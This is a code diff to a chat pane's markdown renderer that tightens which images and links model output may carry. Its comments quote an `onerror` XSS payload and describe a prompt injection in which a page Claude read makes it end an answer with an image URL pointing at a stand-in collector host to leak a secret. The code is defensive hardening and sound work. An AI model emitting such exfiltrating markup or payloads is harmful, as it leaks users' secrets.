@@ -4,14 +4,14 @@ import { Marked, type Tokens } from 'marked';
 // What Claude writes, as HTML the chat pane can put on screen. Everything that arrives here is text a
 // model produced from files, web pages and tool output nobody has read, so the HTML it is allowed to
 // carry is decided here and nowhere else: raw HTML in the text is shown as text, a link keeps only an
-// address that opens in the browser, and an image only one that cannot reach the disk.
+// address that opens in the browser, and an image only one carried inline.
 //
 // What getting it wrong looks like: a README Claude quotes holds `<img src=x onerror=...>`, and the
 // script runs inside the window that owns every shell.
 
 const LINK_PROTOCOLS = ['http:', 'https:', 'mailto:'];
 
-export function escapeHtml(text: string): string {
+function escapeHtml(text: string): string {
   return text.replace(/[&<>"']/g, (character) => `&#${character.charCodeAt(0)};`);
 }
 
@@ -25,14 +25,15 @@ export function safeLink(href: string): string | null {
   }
 }
 
-// An image from the web or one carried inline. `file:` is what is left out: an image tag pointed at
-// the disk is a way to ask the window whether a file exists.
+// Only an image carried inline. One from the web is fetched the moment it is drawn, so a page Claude
+// read could have it end an answer with `![](https://collector.example/?d=<a secret>)` and the screen
+// would send the secret out with no tool call asked about. One on the disk is a way to ask the window
+// whether a file exists. Either is shown as a link instead, which opens only on a click.
 export function safeImage(href: string): string | null {
-  if (/^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/.test(href)) return href;
-  return href.startsWith('https://') && safeLink(href) ? href : null;
+  return /^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/.test(href) ? href : null;
 }
 
-export function highlightCode(code: string, language: string | undefined): string {
+function highlightCode(code: string, language: string | undefined): string {
   const known = language && hljs.getLanguage(language) ? language : null;
   // ponytail: no guessing at an unlabelled block — highlightAuto runs every grammar over it, which
   // costs more than a long answer is worth. Add it when unlabelled blocks turn out to be common.
@@ -55,7 +56,9 @@ const marked = new Marked({
     },
     image({ href, text }: Tokens.Image) {
       const safe = safeImage(href);
-      return safe ? `<img src="${escapeHtml(safe)}" alt="${escapeHtml(text)}">` : escapeHtml(text);
+      if (safe) return `<img src="${escapeHtml(safe)}" alt="${escapeHtml(text)}">`;
+      const link = safeLink(href);
+      return link ? `<a href="${escapeHtml(link)}">${escapeHtml(text || link)}</a>` : escapeHtml(text);
     },
   },
 });
